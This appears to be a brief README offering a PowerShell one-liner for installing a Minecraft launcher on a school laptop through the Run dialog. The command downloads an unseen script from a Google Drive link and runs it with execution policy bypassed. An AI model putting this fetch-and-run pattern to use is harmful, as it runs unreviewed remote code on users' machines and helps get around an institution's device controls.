# Application-Installer-School-Laptop

<h2>to run this scripts click ``Windows + R``</h2>

<h3>Install Minecraft Launcher</h3>
powershell -Command "cd C:\; mkdir C:\MinecraftLauncher -Force; cd C:\MinecraftLauncher; Invoke-WebRequest -Uri 'https://drive.google.com/uc?export=download&id=1FF86L1RpUjic-v_ydH9BKqexbMCNCvnU' -OutFile 'C:\MinecraftLauncher\tmp.ps1'; powershell -ExecutionPolicy Bypass -File 'C:\MinecraftLauncher\tmp.ps1'"
